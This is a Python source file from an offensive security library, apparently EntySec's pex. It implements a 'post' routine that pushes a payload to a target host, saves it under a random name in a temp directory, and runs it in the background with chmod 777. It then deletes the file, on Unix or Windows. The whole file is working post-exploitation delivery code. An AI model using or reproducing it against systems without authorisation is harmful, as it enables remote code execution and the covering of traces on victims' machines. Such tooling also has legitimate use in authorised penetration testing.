"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from typing import Callable, Any, Union, Optional

from pex.string import String
from pex.platform import (
    Platform,
    OS_WINDOWS,
    OS_UNIX
)
from pex.arch import Arch

from pex.post.method import select_method
from pex.post.push import Push
from pex.post.tools import PostTools


class Post(Push, PostTools, String):
    """ Main class of pex.post module.

    This main class of pex.post module is intended for providing
    an implementation of post function that sends a data to the target.
    """

    def post(self,
             payload: Union[bytes, str],
             sender: Callable[..., Any],
             platform: Union[Platform, str],
             arch: Union[Arch, str],
             arguments: Optional[str] = None,
             method: Optional[str] = None,
             location: Optional[str] = None,
             concat: Optional[str] = None,
             background: Optional[str] = None,
             *args, **kwargs) -> None:
        """ Post a payload through the sender function.

        :param Union[bytes, str] payload: payload to post
        :param Callable[..., Any] sender: sender function to send payload to
        :param Union[Platform, str] platform: target platform
        :param Union[Arch, str] arch: target architecture
        :param Optional[str] arguments: payload arguments
        :param Optional[str] method: post method to use
        :param Optional[str] location: path to save payload
        :param Optional[str] concat: post command concat operator
        :param Optional[str] background: post command background operator
        :return None: None
        :raises RuntimeError: with trailing error message
        """

        method_object = select_method(
            methods=self.methods,
            platform=platform,
            method=method
        )

        if not method:
            raise RuntimeError(f"Unsupported method: {method}!")

        filename = self.random_string(8)
        arguments = arguments or ''

        if platform in OS_UNIX:
            location = location or '/tmp'
            concat = concat or ';'
            background = background or '&'

            path = '/'.join((location, filename))

            if isinstance(arch, Arch) and arch.interpreter:
                command = f"{arch.interpreter} {path} {arguments} {concat} rm {path}"
            else:
                command = f"sh -c 'chmod 777 {path} {concat} {path} {arguments} {concat} rm {path}' {background}"

        elif platform in OS_WINDOWS:
            location = location or 'C:\\Windows\\Temp'
            concat = concat or '&'
            background = background or ''

            path = '\\'.join((location, filename))

            if isinstance(arch, Arch) and arch.interpreter:
                command = f"{background} {arch.interpreter} {path} {arguments} {concat} del {path}"
            else:
                command = f"{background} {path} {arguments} {concat} del {path}"

        else:
            raise RuntimeError(f"Platform {platform} in unsupported!")

        if method_object.uri:
            self.push(
                platform=platform,
                method=method,
                sender=sender,
                data=payload if isinstance(payload, bytes) else payload.encode(),
                location=path,
                *args, **kwargs
            )
        else:
            self.push(
                platform=platform,
                method=method,
                sender=sender,
                location=path,
                *args, **kwargs
            )

        self.post_payload(sender, command)
